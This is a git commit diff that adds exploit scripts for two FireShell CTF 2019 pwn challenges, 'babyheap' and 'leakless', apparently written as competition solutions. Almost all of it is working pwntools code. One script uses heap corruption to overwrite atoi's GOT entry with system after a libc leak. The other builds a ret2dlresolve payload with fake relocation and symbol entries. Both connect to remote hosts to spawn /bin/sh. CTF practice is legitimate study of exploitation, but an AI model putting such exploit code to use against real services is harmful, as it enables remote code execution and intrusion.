ab17490bc85a7f9df251e60a9094a9ca665f7f9f
ga <ga@ga-ctf-18.04>
2019-01-28 00:18:47 +0800

    add fireshell_2019/pwn/babyheap solution

--- fireshell_2019/pwn/babyheap/babyheap.py
+++ fireshell_2019/pwn/babyheap/babyheap.py
@@ -1,6 +1,9 @@
 from pwn import *
 
-r = remote("127.0.0.1", 8888)
+r = remote("51.68.189.144", 31005)
+# r = remote("35.243.188.20", 2000)
+# r = remote("127.0.0.1", 8888)
+context.arch = "amd64"
 
 def new():
 	r.recvuntil("> ")
@@ -28,13 +31,27 @@ def magic(data):
 	r.recvuntil("Fill ")
 	r.send(data)	
 
+atoi_got = 0x602060
+
 new()
 delete()
-edit(p64(0x60208d))
+edit(p64(0x60209d))
 new()
-magic("\x00" * 0x2b + p64(0x602090))
+magic("\x00" * 0x2b + p64(atoi_got))
 
+# leak libc base
+atoi_off = 0x38db0
+libc = u64(show().ljust(8, "\x00")) - atoi_off
+print("libc : " + hex(libc))
 
+# overwrite atoi() with system()
+system_off = 0x47dc0
+system = libc + system_off
+edit(p64(system))
+
+# atoi("/bin/sh\x00") => system("/bin/sh\x00")
+r.recvuntil("> ")
+r.send("/bin/sh\x00")
 
 r.interactive()
 
--- fireshell_2019/pwn/leakless/leakless.py
+++ fireshell_2019/pwn/leakless/leakless.py
@@ -14,23 +14,24 @@ read_plt = 0x080483c0
 read_got = 0x0804a00c
 addr_plt_start = 0x080483b0
 addr_rel_plt = 0x08048354
-#index_off = (buf + 28) - addr_rel_plt
+index_off = (buf + 28) - addr_rel_plt
 addr_dynsym = 0x080481cc
 addr_dynstr = 0x0804828c
-#addr_fake_sym = buf + 36
-#align = 0x10 - ((addr_fake_sym - addr_dynsym) & 0xf)
-#addr_fake_sym = addr_fake_sym + align
-#index_dynsym = (addr_fake_sym - addr_dynsym) / 0x10
-#r_info = (index_dynsym << 8) | 0x7
-#fake_reloc = p32(read_got) + p32(r_info)
-#st_name = (addr_fake_sym + 16) - addr_dynstr
-#fake_sym = flat([st_name, 0, 0, 0x12])
+addr_fake_sym = buf + 36
+align = 0x10 - ((addr_fake_sym - addr_dynsym) & 0xf)
+addr_fake_sym = addr_fake_sym + align
+index_dynsym = (addr_fake_sym - addr_dynsym) / 0x10
+r_info = (index_dynsym << 8) | 0x7
+fake_reloc = p32(read_got) + p32(r_info)
+st_name = (addr_fake_sym + 16) - addr_dynstr
+fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
 
 payload1 = "a" * 76 + flat([read_plt, pop_esi_edi_ebp, 0, buf, 100, pop_ebp, buf, leave_ret])
-raw_input('aaa')
 r.send(payload1)
+
 cmd = "/bin/sh\x00"
 
+"""
 index_offset = (buf + 28) - addr_rel_plt
 puts_got = 0x804a018
 addr_fake_sym = buf + 36
@@ -55,9 +56,10 @@ payload2 += "a" * (80 - len(payload2))
 payload2 += cmd
 payload2 += "a" * (100 - len(payload2))
 #raw_input('aaa')
-#r.send(payload2)
-
+r.send(payload2)
 """
+
+
 payload2 = flat(["aaaa", addr_plt_start, index_off, "aaaa", buf+80, "aaaa", "aaaa"])
 payload2 += fake_reloc
 payload2 += "b" * align
@@ -66,9 +68,8 @@ payload2 += "system\x00"
 payload2 += "a" * (80 - len(payload2))
 payload2 += cmd
 payload2 += "a" * (100 - len(payload2))
-#raw_input('aaa')
+raw_input('aaa')
 r.send(payload2)
-"""
 
 r.interactive()
 
